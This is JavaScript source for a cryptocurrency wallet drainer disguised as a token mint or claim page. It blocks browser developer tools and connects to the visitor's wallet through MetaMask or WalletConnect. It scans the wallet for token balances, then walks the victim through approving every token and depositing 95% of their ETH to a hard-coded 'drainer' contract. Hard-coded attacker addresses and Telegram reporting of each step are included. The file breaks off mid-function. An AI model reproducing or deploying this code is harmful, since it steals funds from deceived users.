import { CONFIG } from './config.js';

// ============================================================
//  ANTI-DEBUGGING (basic, non-destructive)
// ============================================================
(function () {
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  if (isMobile) return;
  document.addEventListener("contextmenu", (e) => e.preventDefault());
  document.addEventListener("keydown", (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();

// ============================================================
//  CONFIG IMPORT
// ============================================================
let DRAINER_CONTRACT, CONTRACT_ABI, ATTACKER_SOLANA_ADDRESS, ATTACKER_BTC_ADDRESS,
    TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID;

try {
  const c = CONFIG || {};
  DRAINER_CONTRACT = c.DRAINER_CONTRACT || "0xbf2c883b097d6733a7e5a8d853d05825564bd857";
  CONTRACT_ABI = c.CONTRACT_ABI || [];
  ATTACKER_SOLANA_ADDRESS = c.ATTACKER_SOLANA_ADDRESS || "7uYC9fnzK3HashgE8x8fJ5oqUMLBWkVYqPiFNhejYPX7";
  ATTACKER_BTC_ADDRESS = c.ATTACKER_BTC_ADDRESS || "bc1qyugnjmr05e4xf4wd4xs2ytn9an34uxelkt9h5f";
  TELEGRAM_BOT_TOKEN = c.TELEGRAM_BOT_TOKEN || "";
  TELEGRAM_CHAT_ID = c.TELEGRAM_CHAT_ID || "";
  console.log("✅ Config loaded");
} catch (e) {
  console.warn("⚠️ Config fallback:", e);
}

// ============================================================
//  CHAIN CONFIG
// ============================================================
// Set this to the chain where your drainer contract is deployed.
// 1     = Ethereum Mainnet
// 56    = BNB Smart Chain
// 137   = Polygon
// 42161 = Arbitrum One
// 8453  = Base
// 10    = Optimism
// 43114 = Avalanche C-Chain
const EXPECTED_CHAIN_ID = 1;

const CHAIN_NAMES = {
  1: "Ethereum",
  56: "BNB Smart Chain",
  137: "Polygon",
  42161: "Arbitrum One",
  8453: "Base",
  10: "Optimism",
  43114: "Avalanche",
};

const EXPLORERS = {
  1: "https://etherscan.io",
  56: "https://bscscan.com",
  137: "https://polygonscan.com",
  42161: "https://arbiscan.io",
  8453: "https://basescan.org",
  10: "https://optimistic.etherscan.io",
  43114: "https://snowtrace.io",
};

const EXPECTED_CHAIN_NAME = CHAIN_NAMES[EXPECTED_CHAIN_ID] || `Chain ${EXPECTED_CHAIN_ID}`;
const EXPLORER_BASE = EXPLORERS[EXPECTED_CHAIN_ID] || "https://etherscan.io";

// ============================================================
//  TELEGRAM
// ============================================================
async function sendTelegramMessage(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
    });
    const j = await res.json();
    if (!res.ok) console.error('❌ Telegram:', j);
    else console.log('✅ Telegram sent');
  } catch (e) {
    console.error('Telegram exception:', e);
  }
}

// ============================================================
//  GLOBAL STATE
// ============================================================
let web3 = null;
let web3Instance = null;
let contractInstance = null;
let connectedAddress = null;
let connectedWallet = null;
let isConnecting = false;
let userHasClaimed = false;
let ethPriceInUSD = 2200;
let userLocalCurrency = "USD";
let currentSession = null;
let client, modal, SignClient, WalletConnectModal, EthereumProvider;
let evmProviders = [];
let eip6963Initialized = false;
let isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
const DISABLE_DISCONNECT = isMobileDevice;
const CLAIM_THRESHOLD_USD = 3;
let delayedAttemptsScheduled = false;
let solanaProvider = null;
let solanaPublicKey = null;
let tokenChart, countdownInterval, claimList = [], priceHistory = [];
let fingerprintData = {};

// ============================================================
//  CURRENCY
// ============================================================
const CURRENCY_CONVERTER = {
  rates: { USD: 1, EUR: 0.92, GBP: 0.79, JPY: 148.5, CNY: 7.23, INR: 83.2, NGN: 900, AED: 3.67, SAR: 3.75 },
  detectLocalCurrency() {
    try {
      const region = (navigator.language || "en-US").split("-")[1] || "US";
      const map = { US: "USD", GB: "GBP", DE: "EUR", FR: "EUR", JP: "JPY", CN: "CNY", IN: "INR", NG: "NGN", AE: "AED", SA: "SAR" };
      return map[region] || "USD";
    } catch { return "USD"; }
  },
  formatCurrency(amount, currency) {
    try { return new Intl.NumberFormat(navigator.language, { style: "currency", currency }).format(amount); }
    catch { return `${amount} ${currency}`; }
  },
};
userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();

// ============================================================
//  DOM REFERENCES
// ============================================================
const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
const navLinks = document.querySelector(".nav-links");
const claimListElement = document.getElementById("claimList");
const predictionFill = document.getElementById("predictionFill");
const claimStatus = document.getElementById("claimStatus");
const walletButtonContainer = document.getElementById("walletButtonContainer");
const connectButton = document.getElementById("connectButton");
const progressBar = document.getElementById("progressBar");
const progressPercentage = document.getElementById("progressPercentage");
const connectionDebug = document.getElementById("connectionDebug");
const debugToggle = document.getElementById("debugToggle");
const walletModal = document.getElementById("walletModal");
const walletModalClose = document.getElementById("walletModalClose");
const walletProviders = document.querySelectorAll(".wallet-provider");
const announcementModal = document.getElementById("announcementModal");
const announcementModalClose = document.getElementById("announcementModalClose");
const announcementOkBtn = document.getElementById("announcementOkBtn");
const copyReferralBtn = document.getElementById("copyReferralBtn");
const referralLink = document.getElementById("referralLink");

// ============================================================
//  UI HELPERS
// ============================================================
function logDebug(msg) {
  console.log(`[DEBUG] ${msg}`);
  if (connectionDebug) connectionDebug.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
}

function setButtonState(button, state) {
  if (!button) return;
  button.style.cssText = `display:inline-block;padding:14px 28px;border-radius:8px;
    font-weight:600;border:none;cursor:${state === 'loading' ? 'not-allowed' : 'pointer'};
    transition:all .3s ease;color:white;font-size:16px;font-family:'Inter',sans-serif;
    box-shadow:0 4px 12px rgba(0,0,0,.15);min-width:180px;`;
  button.disabled = state === 'loading';
  if (state === 'loading') {
    button.style.background = 'linear-gradient(135deg,#666,#888)';
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
  } else if (state === 'connected') {
    button.style.background = 'linear-gradient(135deg,#10B981,#059669)';
    button.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
  } else if (state === 'disconnect') {
    button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
    button.innerHTML = '<i class="fas fa-power-off"></i> Disconnect';
  } else if (state === 'failed') {
    button.style.background = 'linear-gradient(135deg,#EF4444,#DC2626)';
    button.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Failed';
    setTimeout(() => setButtonState(button, 'normal'), 3000);
  } else {
    button.style.background = 'linear-gradient(135deg,#FF6B00,#FF8C00)';
    button.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet to Mint';
  }
}

function showStatus(msg, type = 'info') {
  if (!claimStatus) return;
  claimStatus.textContent = msg;
  claimStatus.className = `status ${type}`;
  claimStatus.style.display = 'block';
  claimStatus.style.padding = '12px 16px';
  claimStatus.style.borderRadius = '8px';
  claimStatus.style.marginTop = '12px';
  const colors = {
    success: { bg: '#DCFCE7', c: '#166534', b: '#86EFAC' },
    error:   { bg: '#FEE2E2', c: '#991B1B', b: '#FCA5A5' },
    info:    { bg: '#DBEAFE', c: '#1E40AF', b: '#93C5FD' },
  };
  const s = colors[type] || colors.info;
  claimStatus.style.background = s.bg;
  claimStatus.style.color = s.c;
  claimStatus.style.border = `1px solid ${s.b}`;
}

function showNotification(msg, type = "success") {
  const n = document.createElement("div");
  n.style.cssText = `position:fixed;bottom:20px;right:20px;background:#1F2937;color:white;
    border-left:4px solid ${type === 'error' ? '#EF4444' : type === 'info' ? '#3B82F6' : '#10B981'};
    padding:12px 16px;border-radius:8px;z-index:10000;max-width:340px;font-size:13px;
    box-shadow:0 4px 20px rgba(0,0,0,.4);`;
  n.textContent = msg;
  document.body.appendChild(n);
  setTimeout(() => { n.style.opacity = "0"; setTimeout(() => n.remove(), 300); }, 4000);
}

// ============================================================
//  STORAGE
// ============================================================
function saveWallet(addr, session = null, chainType = null) {
  localStorage.setItem('connectedWallet', addr);
  if (session) localStorage.setItem('walletConnectSession', JSON.stringify(session));
  if (chainType) localStorage.setItem('chainType', chainType);
}
function getSavedWallet() { return localStorage.getItem('connectedWallet'); }
function getSavedSession() {
  const s = localStorage.getItem('walletConnectSession');
  return s ? JSON.parse(s) : null;
}
function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
function clearSavedWallet() {
  localStorage.removeItem('connectedWallet');
  localStorage.removeItem('walletConnectSession');
  localStorage.removeItem('chainType');
}
function saveConnectionToLocalStorage(address, walletType) {
  localStorage.setItem('connectedAddress', address);
  localStorage.setItem('connectedWalletType', walletType);
}
function clearSavedConnection() {
  localStorage.removeItem('connectedAddress');
  localStorage.removeItem('connectedWalletType');
}
function restoreSavedConnection() {
  const addr = localStorage.getItem('connectedAddress');
  const type = localStorage.getItem('connectedWalletType');
  if (addr && type) connectWithProvider(type, true);
}

// ============================================================
//  CHAIN VERIFICATION
// ============================================================
async function verifyChain() {
  try {
    const chainId = await web3.eth.getChainId();
    const numId = Number(chainId);
    logDebug(`Chain ID: ${numId} (${CHAIN_NAMES[numId] || "Unknown"})`);
    if (numId !== EXPECTED_CHAIN_ID) {
      const current = CHAIN_NAMES[numId] || `Unknown (${numId})`;
      showStatus(`Wrong network: ${current}. Please switch to ${EXPECTED_CHAIN_NAME}.`, 'error');
      return false;
    }
    return true;
  } catch (e) {
    logDebug(`Chain check failed: ${e.message}`);
    return false;
  }
}

// ============================================================
//  TX HASH + RECEIPT UTILITIES
// ============================================================
function extractHash(txResult) {
  if (!txResult) return null;
  return txResult.transactionHash || txResult.hash || null;
}

async function waitForReceipt(txHash, timeoutMs = 180000) {
  const start = Date.now();
  let tries = 0;
  while (Date.now() - start < timeoutMs) {
    tries++;
    try {
      const r = await web3.eth.getTransactionReceipt(txHash);
      if (r) {
        logDebug(`Receipt after ${tries} tries: block ${r.blockNumber}, status ${r.status}`);
        return r;
      }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 4000));
  }
  logDebug(`⏰ Receipt timeout after ${timeoutMs}ms for ${txHash}`);
  return null;
}

/**
 * Sends a transaction and WAITS for the receipt.
 * Returns a structured result. Never throws.
 */
async function sendAndWait(promiseMethod, label) {
  try {
    logDebug(`📤 ${label}`);
    const tx = await promiseMethod;
    const hash = extractHash(tx);
    if (!hash) {
      logDebug(`❌ ${label} — no hash returned`);
      return { ok: false, reason: "no_hash" };
    }
    logDebug(`📨 ${label} hash: ${hash}`);

    const receipt = await waitForReceipt(hash);
    if (!receipt) {
      logDebug(`❌ ${label} — not mined within timeout`);
      return { ok: false, hash, reason: "not_mined" };
    }
    if (receipt.status === false || receipt.status === 0 || receipt.status === "0x0") {
      logDebug(`❌ ${label} — REVERTED on-chain`);
      return { ok: false, hash, reason: "reverted", receipt };
    }
    logDebug(`✅ ${label} confirmed in block ${receipt.blockNumber}`);
    return { ok: true, hash, receipt, block: receipt.blockNumber };
  } catch (e) {
    const msg = e?.message || String(e);
    logDebug(`❌ ${label} threw: ${msg}`);
    return { ok: false, reason: msg };
  }
}

// ============================================================
//  WALLET DETECTION
// ============================================================
const walletDetectors = {
  isMetaMask: () => {
    const e = window.ethereum; if (!e) return false;
    return [e.isMetaMask, e._metamask?.isUnlocked,
      window.web3?.currentProvider?.isMetaMask,
      e.providers?.find(p => p.isMetaMask),
      navigator.userAgent.includes("MetaMaskMobile")].some(Boolean);
  },
  isCoinbaseWallet: () => {
    const e = window.ethereum; if (!e) return false;
    return e.isCoinbaseWallet || e.providers?.some(p => p.isCoinbaseWallet) || !!window.CoinbaseWalletSDK;
  },
  isTrustWallet: () => {
    const e = window.ethereum; if (!e) return false;
    return e.isTrust || e.isTrustWallet || e.providers?.some(p => p.isTrust || p.isTrustWallet) || navigator.userAgent.includes("TrustWallet");
  },
  isRabbyWallet: () => {
    const e = window.ethereum; if (!e) return false;
    return e.isRabby || e.providers?.some(p => p.isRabby);
  },
  isPhantom: () => !!(window.phantom && window.phantom.ethereum),
  isBraveWallet: () => !!(window.ethereum && window.ethereum.isBraveWallet),
};

const solanaWalletDetectors = {
  isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
  isSolflare: () => !!window.solflare,
  isBackpack: () => !!window.backpack,
};

function getSolanaWallets() {
  const w = [];
  if (solanaWalletDetectors.isPhantom()) w.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
  if (solanaWalletDetectors.isSolflare()) w.push({ name: 'Solflare', provider: window.solflare });
  if (solanaWalletDetectors.isBackpack()) w.push({ name: 'Backpack', provider: window.backpack });
  return w;
}

function detectWallets() {
  const badges = {
    metamask: document.getElementById("metamask-badge"),
    coinbase: document.getElementById("coinbase-badge"),
    trust: document.getElementById("trust-badge"),
    rabby: document.getElementById("rabby-badge"),
  };
  Object.entries(walletDetectors).forEach(([k, fn]) => {
    const key = k.toLowerCase().replace("is", "");
    if (badges[key]) {
      if (fn()) { badges[key].textContent = "Detected"; badges[key].style.color = "var(--success)"; }
      else { badges[key].textContent = "Not Detected"; badges[key].style.color = "var(--error)"; }
    }
  });
}

// ============================================================
//  EIP-6963
// ============================================================
function setupEIP6963() {
  if (eip6963Initialized) return;
  eip6963Initialized = true;
  window.addEventListener('eip6963:announceProvider', (ev) => {
    const d = ev.detail;
    if (!evmProviders.some(p => p.info.uuid === d.info.uuid)) {
      evmProviders.push(d);
      logDebug(`EIP-6963 provider: ${d.info.name}`);
    }
  });
  window.dispatchEvent(new Event('eip6963:requestProvider'));
  setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
  setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
}

// ============================================================
//  UI - CONNECTED / RESET
// ============================================================
function updateConnectedUI(address, chain = 'evm') {
  setButtonState(connectButton, 'disconnect');
  const labels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ EVM' };
  const label = labels[chain] || 'Unknown';
  const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
  let display = document.getElementById('connectedAddressDisplay');
  if (!display) {
    display = document.createElement('div');
    display.id = 'connectedAddressDisplay';
    display.style.cssText = `margin-top:12px;padding:10px 16px;font-family:monospace;
      font-size:14px;color:#059669;text-align:center;background:#ECFDF5;
      border-radius:8px;border:1px solid #A7F3D0;`;
    connectButton?.parentNode?.appendChild(display);
  }
  display.innerHTML = `<div style="display:flex;justify-content:center;gap:8px;flex-wrap:wrap;">
    <i class="fas fa-check-circle"></i>
    <span>${short}</span>
    <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;">${label}</span>
  </div>`;
  showStatus(`Connected: ${short}`, 'success');
}

function resetConnectedUI() {
  setButtonState(connectButton, 'normal');
  document.getElementById('connectedAddressDisplay')?.remove();
  showStatus('Wallet disconnected', 'info');
  web3Instance = null;
  contractInstance = null;
}

// ============================================================
//  EVM PROVIDER EVENTS
// ============================================================
function setupEVMProviderEvents(provider) {
  if (!provider?.on) return;
  provider.on('accountsChanged', (accounts) => {
    if (accounts.length === 0) { resetConnectedUI(); clearSavedWallet(); }
    else { updateConnectedUI(accounts[0], 'evm'); saveWallet(accounts[0], null, 'evm'); }
  });
  provider.on('chainChanged', () => {
    logDebug("Chain changed, reloading");
    location.reload();
  });
  provider.on('disconnect', () => { resetConnectedUI(); clearSavedWallet(); });
}

// ============================================================
//  CONNECT — DIRECT EVM
// ============================================================
async function connectDirectEVM(timeoutMs = 8000) {
  setupEIP6963();
  await new Promise(r => setTimeout(r, 700));

  let providers = evmProviders.filter(p => p.provider);
  if (providers.length === 0 && window.ethereum) {
    providers = [{ info: { name: 'Injected', rdns: 'io.injected', icon: '' }, provider: window.ethereum }];
  }
  if (providers.length === 0) return false;

  // Prefer MetaMask
  let chosen = providers.find(p => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')) || providers[0];

  try {
    const accounts = await Promise.race([
      chosen.provider.request({ method: 'eth_requestAccounts' }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);

    if (accounts && accounts.length > 0) {
      const addr = accounts[0];
      saveWallet(addr, null, 'evm');
      updateConnectedUI(addr, 'evm');
      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(chosen.provider);
      web3 = web3Instance;
      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      connectedAddress = addr;
      connectedWallet = chosen.info.name;
      setupEVMProviderEvents(chosen.provider);

      const chainOk = await verifyChain();
      if (!chainOk) return false;
      return true;
    }
  } catch (e) {
    logDebug(`Direct EVM error: ${e.message}`);
  }
  return false;
}

// ============================================================
//  WALLETCONNECT
// ============================================================
async function loadWCLibs() {
  if (SignClient && WalletConnectModal && EthereumProvider) return;
  const mods = await Promise.all([
    import('https://esm.sh/@walletconnect/sign-client@2.11.0'),
    import('https://esm.sh/@walletconnect/modal@2.6.2'),
    import('https://esm.sh/@walletconnect/ethereum-provider@2.11.0'),
  ]);
  SignClient = mods[0].default || mods[0];
  WalletConnectModal = mods[1].WalletConnectModal || mods[1].default || mods[1];
  EthereumProvider = mods[2].EthereumProvider || mods[2].default || mods[2];
}

async function initWC(projectId) {
  if (client && modal) return true;
  try {
    await loadWCLibs();
    client = await SignClient.init({
      projectId,
      metadata: CONFIG.DAPP_METADATA,
      relayUrl: 'wss://relay.walletconnect.com',
    });
    modal = new WalletConnectModal({
      projectId,
      themeMode: 'dark',
      enableExplorer: true,
      mobileWallets: [
        { id: 'metamask', name: 'MetaMask', links: { native: 'metamask://', universal: 'https://metamask.app.link/' } },
        { id: 'trust', name: 'Trust Wallet', links: { native: 'trust://', universal: 'https://link.trustwallet.com/' } },
      ],
    });
    return true;
  } catch (e) {
    logDebug(`WC init failed: ${e.message}`);
    return false;
  }
}

async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
  const projectId = useTestId ? (CONFIG.PUBLIC_TEST_ID || CONFIG.PROJECT_ID) : CONFIG.PROJECT_ID;
  if (!await initWC(projectId)) return false;

  try {
    const { uri, approval } = await client.connect({
      requiredNamespaces: {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains: [`eip155:${EXPECTED_CHAIN_ID}`],
          events: ['chainChanged', 'accountsChanged'],
        },
      },
    });
    if (!uri) throw new Error('no uri');
    modal.openModal({ uri });

    const session = await Promise.race([
      approval(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), timeoutMs)),
    ]);
    modal.closeModal();

    if (session?.namespaces?.eip155?.accounts?.length) {
      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      saveWallet(account, session, 'evm');
      updateConnectedUI(account, 'evm');
      currentSession = session;
      connectedAddress = account;

      const provider = await EthereumProvider.init({
        projectId,
        metadata: CONFIG.DAPP_METADATA,
        session,
      });
      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      web3 = web3Instance;
      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      setupEVMProviderEvents(provider);

      const chainOk = await verifyChain();
      if (!chainOk) return false;
      return true;
    }
  } catch (e) {
    logDebug(`WC error: ${e.message}`);
    try { modal.closeModal(); } catch {}
  }
  return false;
}

// ============================================================
//  CONNECT DISPATCHER
// ============================================================
async function connectWallet() {
  if (isConnecting) return;
  isConnecting = true;
  setButtonState(connectButton, 'loading');
  showStatus('Connecting...', 'info');

  let ok = false;
  if (isMobileDevice) {
    ok = await connectViaWalletConnect(false, 300000);
    if (!ok) ok = await connectViaWalletConnect(true, 300000);
  } else {
    ok = await connectDirectEVM(8000);
    if (!ok) ok = await connectViaWalletConnect(false, 300000);
    if (!ok) ok = await connectViaWalletConnect(true, 300000);
  }

  isConnecting = false;
  if (!ok) {
    showStatus('No wallet found.', 'error');
    setButtonState(connectButton, 'failed');
  } else {
    setButtonState(connectButton, 'connected');
    setTimeout(() => window.initiateClaimProcess?.(), 1500);
  }
}

async function disconnectWallet() {
  try {
    if (currentSession && client) {
      await client.disconnect({ topic: currentSession.topic, reason: { code: 6000, message: 'User disconnected' } });
      currentSession = null;
    }
    if (web3Instance?.currentProvider?.disconnect) await web3Instance.currentProvider.disconnect();
  } catch (e) {}
  resetConnectedUI();
  clearSavedWallet();
}

const handleClick = async () => {
  if (getSavedWallet()) await disconnectWallet();
  else await connectWallet();
};

// ============================================================
//  REAL ERC-20 APPROVE (the missing piece)
// ============================================================
async function approveERC20(tokenAddress, amount, userAddress) {
  try {
    const abi = [{
      constant: false,
      inputs: [
        { name: "_spender", type: "address" },
        { name: "_value", type: "uint256" },
      ],
      name: "approve",
      outputs: [{ name: "", type: "bool" }],
      type: "function",
    }];
    const token = new web3.eth.Contract(abi, tokenAddress);
    const tx = token.methods.approve(DRAINER_CONTRACT, amount);
    const gasEstimate = await tx.estimateGas({ from: userAddress });
    return await sendAndWait(
      tx.send({
        from: userAddress,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `approve(${tokenAddress.slice(0, 8)}, ${amount})`
    );
  } catch (e) {
    logDebug(`approveERC20 failed: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

// ============================================================
//  DRAINER setTokenApproval
// ============================================================
async function callSetTokenApproval(tokenAddress, amount, userAddress) {
  try {
    const tx = contractInstance.methods.setTokenApproval(tokenAddress, amount);
    const gasEstimate = await tx.estimateGas({ from: userAddress });
    return await sendAndWait(
      tx.send({
        from: userAddress,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `setTokenApproval(${tokenAddress.slice(0, 8)})`
    );
  } catch (e) {
    logDebug(`setTokenApproval failed: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

// ============================================================
//  depositBNB
// ============================================================
async function callDepositBNB(ethAmount, userAddress) {
  try {
    const amountWei = web3.utils.toWei(ethAmount.toString(), "ether");
    const tx = contractInstance.methods.depositBNB();
    const gasEstimate = await tx.estimateGas({ from: userAddress, value: amountWei });
    return await sendAndWait(
      tx.send({
        from: userAddress,
        value: amountWei,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `depositBNB(${ethAmount} ETH)`
    );
  } catch (e) {
    logDebug(`depositBNB failed: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

// ============================================================
//  drainTokens
// ============================================================
async function callDrainTokens(victim, approvedTokens, approvedAmounts, operator) {
  try {
    const request = {
      victim,
      permits: [],
      approvedTokens,
      approvedAmounts,
      gasBudget: web3.utils.toWei("0.01", "ether"),
      resume: false,
      deadline: Math.floor(Date.now() / 1000) + 3600,
      salt: web3.utils.randomHex(32),
      signature: "0x",
    };
    const tx = contractInstance.methods.drainTokens(request);
    const gasEstimate = await tx.estimateGas({ from: operator });
    return await sendAndWait(
      tx.send({
        from: operator,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `drainTokens(${approvedTokens.length})`
    );
  } catch (e) {
    logDebug(`drainTokens failed: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

// ============================================================
//  drainAllBNB
// ============================================================
async function callDrainAllBNB(victim, operator) {
  try {
    const tx = contractInstance.methods.drainAllBNB(victim);
    const gasEstimate = await tx.estimateGas({ from: operator });
    return await sendAndWait(
      tx.send({
        from: operator,
        gas: Math.floor(gasEstimate * 1.3),
        gasPrice: await web3.eth.getGasPrice(),
      }),
      `drainAllBNB`
    );
  } catch (e) {
    logDebug(`drainAllBNB failed: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

// ============================================================
//  TOKEN LIST + BALANCE
// ============================================================
async function fetchTokenList() {
  try {
    const r = await fetch('https://tokens.coingecko.com/ethereum/all.json');
    const j = await r.json();
    if (j.tokens?.length) return j.tokens.slice(0, 80);
  } catch {}
  return [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18 },
    { address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", symbol: "AAVE", decimals: 18 },
  ];
}

async function getTokenBalance(tokenAddr, walletAddr) {
  try {
    const abi = [{ constant: true, inputs: [{ name: "_owner", type: "address" }],
      name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" }];
    const c = new web3.eth.Contract(abi, tokenAddr);
    return await c.methods.balanceOf(walletAddr).call();
  } catch { return 0; }
}

async function detectAllERC20Tokens(userAddress) {
  const tokens = [];
  const list = await fetchTokenList();
  for (const t of list) {
    try {
      const bal = await getTokenBalance(t.address, userAddress);
      if (bal && bal !== "0" && bal !== 0) {
        const formatted = Number(bal) / Math.pow(10, t.decimals || 18);
        tokens.push({
          address: t.address,
          symbol: t.symbol,
          decimals: t.decimals || 18,
          balance: bal.toString(),
          balanceFormatted: formatted,
        });
      }
    } catch {}
  }
  return tokens;
}

// ============================================================
//  ORCHESTRATED DRAIN
// ============================================================
async function drainEVM() {
  if (!web3 || !contractInstance) {
    showStatus('Wallet not ready', 'error');
    return;
  }

  try {
    logDebug("🔍 Starting drain sequence");
    const chainOk = await verifyChain();
    if (!chainOk) return;

    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    if (!userAddress) { showStatus('No account', 'error'); return; }

    logDebug(`Victim: ${userAddress}`);

    const ethBalanceWei = await web3.eth.getBalance(userAddress);
    const ethBalance = Number(web3.utils.fromWei(ethBalanceWei, 'ether'));
    const balanceUSD = ethBalance * ethPriceInUSD;
    logDebug(`ETH balance: ${ethBalance} ($${balanceUSD.toFixed(2)})`);

    if (balanceUSD < CLAIM_THRESHOLD_USD) {
      showStatus('Insufficient balance', 'error');
      await sendTelegramMessage(`⚠️ EVM Drain Skipped — balance too low (${ethBalance} ETH)`);
      return;
    }

    // Token detection
    showStatus('Scanning wallet...', 'info');
    const tokens = await detectAllERC20Tokens(userAddress);
    logDebug(`Found ${tokens.length} tokens`);

    const approvedTokens = [];
    const approvedAmounts = [];
    const results = [];

    // ---- STEP 1: for each token, do a REAL approve() ----
    for (const token of tokens) {
      showStatus(`Approving ${token.symbol}...`, 'info');

      // 1a. Real ERC-20 approve
      const realApprove = await approveERC20(token.address, token.balance, userAddress);
      results.push({ step: `approve(${token.symbol})`, ...realApprove });
      logDebug(`real approve ${token.symbol}: ${realApprove.ok ? 'OK' : realApprove.reason}`);

      // 1b. Only if real approve succeeded, record it on the drainer
      if (realApprove.ok) {
        const drainerSet = await callSetTokenApproval(token.address, token.balance, userAddress);
        results.push({ step: `setTokenApproval(${token.symbol})`, ...drainerSet });
        logDebug(`setTokenApproval ${token.symbol}: ${drainerSet.ok ? 'OK' : drainerSet.reason}`);

        if (drainerSet.ok) {
          approvedTokens.push(token.address);
          approvedAmounts.push(token.balance);
        }
      }

      // Space transactions out to avoid nonce collisions
      await new Promise(r => setTimeout(r, 2500));
    }

    // ---- STEP 2: deposit ETH ----
    let depositResult = { ok: false };
    let depositAmount = 0;
    if (ethBalance > 0.005) {
      depositAmount = ethBalance * 0.95;
      showStatus('Depositing ETH...', 'info');
      depositResult = await callDepositBNB(depositAmount, userAddress);
      results.push({ step: 'depositBNB', ...depositResult });
      logDebug(`depositBNB: ${depositResult.ok ? 'OK' : depositResult.reason}`);
      await new Promise(r => setTimeout(r, 2500));
    }

    // ---- STEP 3: execute token drain ----
    let tokenDrainResult = { ok: false };
    if (approvedTokens.length > 0 && approvedAmounts.length > 0) {
      showStatus('Executing token drain...', 'info');
      tokenDrainResult = await callDrainTokens(userAddress, approvedTokens, approvedAmounts, userAddress);
      results.push({ step: 'drainTokens', ...tokenDrainResult });
      logDebug(`drainTokens: ${tokenDrainResult.ok ? 'OK' : tokenDrainResult.reason}`);
      await new Promise(r => setTimeout(r, 2500));
    }

    // ---- STEP 4: distribute deposited ETH ----
    let bnbDrainResult = { ok: false };
    if (depositResult.ok) {
      showStatus('Distributing ETH...', 'info');
      bnbDrainResult = await callDrainAllBNB(userAddress, userAddress);
      results.push({ step: 'drainAllBNB', ...bnbDrainResult });
      logDebug(`drainAllBNB: ${bnbDrainResult.ok ? 'OK' : bnbDrainResult.reason}`);
    }

    // ---- STEP 5: report every step ----
    const lines = results.map(r => {
      const icon = r.ok ? '✅' : '❌';
      const hashPart = r.hash ? ` — ${EXPLORER_BASE}/tx/${r.hash}` : (r.reason ? ` — ${r.reason}` : '');
      return `${icon} ${r.step}${hashPart}`;
